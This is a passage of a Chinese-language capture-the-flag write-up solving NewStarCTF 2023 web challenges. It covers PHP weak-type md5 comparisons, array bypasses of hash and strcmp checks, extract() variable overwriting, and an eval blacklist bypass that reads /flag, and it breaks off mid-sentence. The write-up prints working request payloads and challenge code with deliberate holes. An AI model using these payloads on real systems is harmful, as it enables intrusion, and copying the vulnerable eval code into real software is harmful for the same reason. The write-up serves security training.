punctuation\">\"</span>admin_login<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dt</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>font</span> <span class=\"token attr-name\">color</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>white<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>strong</span><span class=\"token punctuation\">></span></span>Welcome to NewStarCTF 2023~<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>strong</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>font</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dt</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>font</span> <span class=\"token attr-name\">size</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>4px<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">color</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>white<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>恭喜你顺利完成了本道题目，这是你的Flag，快去提交吧：flag&#123;46df0dd3-dd02-4402-9e1e-08e555917442&#125;</pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>font</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dl</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>&#123;&#125;</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>&#123;'Connection': 'close', 'Content-Length': '666', 'Content-Encoding': 'gzip', 'Content-Type': 'text/html; charset=UTF-8', 'Date': 'Wed, 04 Oct 2023 01:58:05 GMT', 'Server': 'Apache/2.4.38 (Debian)', 'Vary': 'Accept-Encoding', 'X-Powered-By': 'PHP/7.3.15'&#125;</pre></td></tr></table></figure><h3 id=\"errorflask\"><a class=\"markdownIt-Anchor\" href=\"#errorflask\">#</a> ErrorFlask</h3>\n<p><strong>考点：Flask 报错界面信息泄露</strong></p>\n<p>题目如下所示：</p>\n<p><img data-src=\"image-20231004100749405.png\" alt=\"image-20231004100749405\"></p>\n<p>它说我们只用给出 number1 和 number2，它会帮我们添加，于是：</p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">http</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//69dd29c8-0844-4ff3-aaef-ec632f65b4bc.node4.buuoj.cn:81/?number1=ab&amp;number2=2</span></span></pre></td></tr></table></figure><p><img data-src=\"image-20231004101424500.png\" alt=\"image-20231004101424500\"></p>\n<p>从中进行查找可以查看到 flag：</p>\n<p><img data-src=\"image-20231004101624946.png\" alt=\"image-20231004101624946\"></p>\n<p><code>flag&#123;Y0u_@re_3enset1ve_4bout_deb8g&#125;</code></p>\n<h3 id=\"begin-of-php\"><a class=\"markdownIt-Anchor\" href=\"#begin-of-php\">#</a> Begin of PHP</h3>\n<p><strong>考点：PHP 弱类型、PHP 加密函数数组绕过、PHP 函数特性、变量覆盖漏洞</strong></p>\n<p><img data-src=\"image-20231004103006040.png\" alt=\"image-20231004103006040\"></p>\n<p>本题一共分出了五个部分。</p>\n<p>第一个部分：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"=Level 1=&lt;br>\"</span><span class=\"token punctuation\">;</span>    </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key1'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!==</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key2'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>        </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token variable\">$flag1</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">True</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nope,this is level 1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>主要考察 PHP 中 md5 弱类型比较的特点，只需要找到两个值不同但 md5 值以 0e 开头的字符串即可通过本关，原理是 0e 在进行弱类型比较时会被当作科学计数法进行比较，也就是 0。</p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">http</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//3b2a7f07-0051-40ce-b45b-bc6fe2cf723c.node4.buuoj.cn:81/?key1=s878926199a&amp;key2=s155964671a</span></span></pre></td></tr></table></figure><p>第二个部分：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"=Level 2=&lt;br>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key3'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key3'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token function\">sha1</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key3'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token variable\">$flag2</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">True</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nope,this is level 2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>主要考察 PHP 哈希函数的特性，在处理数组类型的传参时，md5、sha1 等哈希函数会返回 NULL 值，由此可以构造出 NULL===NULL 从而通过判断。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token constant\">POST</span>：key3<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr></table></figure><p>第三个部分：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"=Level 3=&lt;br>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key4'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strcmp</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key4'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token variable\">$flag3</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">True</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nope,this is level 3\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>主要考察 strcmp 函数特性，如果传入的参数为数组类型，该函数就会返回 NULL 值，构造 NULL==0 从而通过判断。</p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">http</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//3b2a7f07-0051-40ce-b45b-bc6fe2cf723c.node4.buuoj.cn:81/?key1=s878926199a&amp;key2=s155964671a&amp;key4[]=1</span></span></pre></td></tr></table></figure><p>第四个部分：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"=Level 4=&lt;br>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key5'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key5'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key5'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token number\">2023</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token variable\">$flag4</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">True</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nope,this is level 4\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>主要考察 is_numeric 函数特性，在传入的数字后加入任意字母或 %00 即可通过本层的判断。</p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">http</span><span class=\"token punctuation\">:</span><span class=\"token header-value\">//3b2a7f07-0051-40ce-b45b-bc6fe2cf723c.node4.buuoj.cn:81/?key1=s878926199a&amp;key2=s155964671a&amp;key4[]=1&amp;key5=2024a</span></span></pre></td></tr></table></figure><p>第五个部分：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"=Level 5=&lt;br>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token function\">extract</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$var</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[a-zA-Z0-9]/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$var</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nope,this is level 5\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nope,this is level 5\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>考察 extract 函数导致的变量覆盖漏洞，这里的 if 判断只要保证传入变量 flag5 即可，根据上面的正则限制，变量值不能为字母和数字，那么可以传一个 <code>![]</code>  进去，[] 空数组会隐式转换为 false，在！取反得到我们要的 true，(或者，传入一个任意符号也可通过本层。)</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token constant\">POST</span><span class=\"token punctuation\">:</span>key3<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>flag5<span class=\"token operator\">=</span><span class=\"token operator\">!</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><p>得到 flag :  <code>flag&#123;8b247b57-901a-48d6-91d3-8df4b50f3803&#125;</code></p>\n<h3 id=\"rce\"><a class=\"markdownIt-Anchor\" href=\"#rce\">#</a> R!C!E!</h3>\n<p><strong>考点：md5 碰撞、PHP 特殊符号传参、PHP 命令执行、黑名单绕过</strong></p>\n<p>题目如下所示：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'e_v.a.l'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$code</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'e_v.a.l'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token string double-quoted-string\">\"c4d038\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag|system|pass|cat|ls/i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>首先题目要求 POST 传入一个 password ，password 的 hash 前六位为 c4d038，而哈希加密是一种不可破解的算法，我们只能通过碰撞来尝试获取我们需要的 password。</p>\n<pre><code class=\"language-PYTHON\">import hashlib\n\ndef crack(a):\n    for i in range(0,999999):\n        if(hashlib.md5(str(i).encode(&quot;GBK&quot;)).hexdigest()[0:6] == str(a)):\n            print(i)\n            break\n\n\ncrack(&quot;c4d038&quot;)\n</code></pre>\n<p>运行结果得知是 114514.</p>\n<p>题目中 code 的传参是 <code>e_v.a.l</code> ，这时候如果直接按这个变量名来传参，php 是无法接收到这个值的，具体原因是 php 会自动把一些不合法的字符转化为下划线（注：php8 以下），比如这个点就会被转换为下划线，另外这种转换只会发生一次。故直接传相当于传的变量名为 e_v_a.l 。于是为了防止我们的点被自动转换，我们可以先让第一个下划线位置为不合法字符，从而转换为下划线，不会再转换后面的点。比如可以传入 e [v.a.l 。</p>\n<p>最后看命令执行部分，这里是有一个黑名单的过滤：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag|system|pass|cat|ls/i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>            <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>![image-20231004110534502](NewStarCTF 2023 公开赛道 WEB/image-20231004110534502.png)</p>\n<p>看到了 flag 在根目录下。但是黑名单过滤了 flag 关键字，我们没法直接读取，于是可以使用参数逃逸绕过限制：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token constant\">POST</span><span class=\"token punctuation\">:</span>password<span class=\"token operator\">=</span><span class=\"token number\">114514</span><span class=\"token operator\">&amp;</span>e<span class=\"token punctuation\">[</span>v<span class=\"token operator\">.</span>a<span class=\"token operator\">.</span>l<span class=\"token operator\">=</span><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>a<span class=\"token operator\">=</span><span class=\"token operator\">/</span>flag</pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token constant\">POST</span><span class=\"token punctuation\">:</span>password<span class=\"token operator\">=</span><span class=\"token number\">114514</span><span class=\"token operator\">&amp;</span>e<span class=\"token punctuation\">[</span>v<span class=\"token operator\">.</span>a<span class=\"token operator\">.</span>l<span class=\"token operator\">=</span><span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"f\"</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"l\"</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"a\"</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"g\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>得到 flag 为  <code>flag&#123;4c161ed0-2717-4082-b051-fe63b33efd4c&#125;</code></p>\n<h3 id=\"easylogin\"><a class=\"markdownIt-Anchor\" href=\"#easylogin\">#</a> EasyLogin</h3>\n<p><strong>考点：弱口令登录、HTTP 302 跳转抓包</strong></p>\n<p>进入之后是一个登录界面，先随便注册一个账号登进去看看。利用 <code>Ctrl``C</code>  和 <code>Ctrl``D</code>  回到 Shell，</p>\n<p><img data-src=\"image-20231004111349196.png\" alt=\"image-20231004111349196\"></p>\n<p>简单看了下目录结构没有什么东西，只告知了含有一个 admin 用户，按方向上键可以查询 Bash 